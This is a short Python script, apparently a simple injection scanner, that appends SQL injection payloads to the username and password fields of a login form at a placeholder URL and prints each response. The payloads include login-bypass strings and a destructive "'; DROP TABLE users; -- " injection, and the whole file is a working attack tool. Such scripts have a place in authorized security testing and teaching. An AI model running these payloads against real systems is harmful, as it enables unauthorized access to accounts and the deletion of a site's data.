from utils import send_request, print_response

def test_sql_injection(url, params):
    print("\n[+] Testing for SQL Injection...")
    
    sql_payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; -- "]
    
    for payload in sql_payloads:
        vulnerable_params = {k: v + payload for k, v in params.items()}
        response = send_request(url, data=vulnerable_params)
        print(f"\nTesting payload: {payload}")
        print_response(response)

if __name__ == "__main__":
    target_url = "http://example.com/login"
    params = {"username": "admin", "password": "password"}
    test_sql_injection(target_url, params)
